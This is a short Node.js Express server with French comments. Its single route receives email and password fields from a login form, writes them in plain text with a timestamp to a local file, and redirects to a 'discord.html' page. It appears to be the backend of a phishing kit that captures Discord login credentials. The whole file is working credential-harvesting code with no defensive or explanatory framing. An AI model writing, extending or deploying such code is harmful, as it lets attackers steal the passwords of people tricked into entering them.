const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Dossier pour les fichiers
const dataFolder = path.join(__dirname, 'Données');
if (!fs.existsSync(dataFolder)) {
    fs.mkdirSync(dataFolder);
}

// Middleware pour parser les données JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Servir les fichiers statiques (HTML, CSS, JS)
app.use(express.static(path.join(__dirname, 'public')));

// Route pour traiter les données de connexion
app.post('/submit', (req, res) => {
    const { email, password } = req.body;
    const date = new Date().toISOString();
    const logEntry = `Date et Heure: ${date}\nEmail: ${email}\nMot de passe: ${password}\n\n`;
    
    const filePath = path.join(dataFolder, 'Informations.txt');
    fs.appendFile(filePath, logEntry, err => {
        if (err) {
            console.error('Erreur lors de l\'écriture dans le fichier:', err);
            res.status(500).send('Erreur serveur');
            return;
        }
        res.redirect('/discord.html');
    });
});

// Démarrer le serveur
app.listen(port, () => {
    console.log(`Serveur en écoute sur http://localhost:${port}`);
});
